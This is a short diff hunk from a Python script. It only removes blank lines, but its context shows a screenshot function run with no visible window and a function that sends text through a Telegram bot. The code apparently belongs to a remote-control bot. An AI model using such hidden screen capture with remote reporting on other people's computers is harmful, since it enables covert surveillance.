@@ -53,8 +53,6 @@ def take_screenshot():
         creationflags=subprocess.CREATE_NO_WINDOW,
     )
     return screenshot_path
-
-
 def send_text_back(text):
     try:
         url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
